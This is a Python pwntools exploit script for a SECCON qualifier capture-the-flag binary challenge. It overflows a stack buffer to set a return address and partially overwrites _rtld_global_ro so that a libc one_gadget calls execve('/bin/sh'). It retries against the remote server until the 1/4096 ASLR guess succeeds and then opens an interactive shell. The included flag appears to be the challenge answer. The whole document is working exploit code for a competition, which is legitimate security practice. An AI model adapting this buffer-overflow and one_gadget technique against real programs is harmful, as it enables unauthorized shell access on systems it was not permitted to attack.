#!/usr/bin/env python3
from pwn import *


def connect():
    if args.GDB:
        return gdb.debug(["./chall"], api=True)
    elif args.LOCAL:
        return process(["./chall"])
    else:
        return remote("hiyoko.quals.seccon.jp", 9002)


def main():
    stats = defaultdict(int)
    success_count = 0
    for attempt in range(1, 99999):
        print("***")
        print(f"Attempt #{attempt} (success_count = {success_count})")
        print("***")
        with connect() as tube:
            if args.GDB:
                tube.gdb.Breakpoint("*0x401159")
                tube.gdb.continue_nowait()
            if args.LOCAL:
                libc_base = None
                while libc_base is None:
                    for lib_name, lib_base in tube.libs().items():
                        print(f"{lib_name}@0x{lib_base:x}")
                        if lib_name.endswith("/libc-2.31.so"):
                            libc_base = lib_base
                            break
                print(f"libc_base = 0x{libc_base:x}")
                random_part = (libc_base + 0xE6C81) & 0xFFF000
                stats[random_part >> 12] += 1
                stats_str = []
                for k in sorted(stats.keys()):
                    stats_str.append(f"0x{k:03x}: {stats[k]}")
                print(" ".join(stats_str))
                must_work = random_part == 0
                if must_work:
                    print("Attach with GDB and press Enter")
                    input()
                else:
                    continue
            """
0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
"""
            tube.send(
                flat(
                    {
                        0x88: struct.pack("<Q", 0x401159)  # ret
                        + b"\x81\x0C\x0A",  # partially overwrite _rtld_global_ro; 1/4096 chance
                    }
                )
            )
            try:
                while True:
                    reply = tube.recvline(timeout=5)
                    if (
                        b"Segmentation fault" not in reply
                        and b"stack smashing detected" not in reply
                        and b"Illegal instruction" not in reply
                        and b"invalid pointer" not in reply
                        and b"Bus error" not in reply
                        and b"buffer overflow detected" not in reply
                        and b"Aborted" not in reply
                        and b"glibc detected an invalid stdio handle" not in reply
                    ):
                        break
            except EOFError:
                if args.LOCAL and must_work:
                    print("It must have worked, but it didn't")
                    tube.interactive()
                continue
            print("***")
            print("Success!")
            print("***")
            tube.interactive()  # SECCON{Return-Oriented-Professional_:clap:}
            success_count += 1


if __name__ == "__main__":
    main()
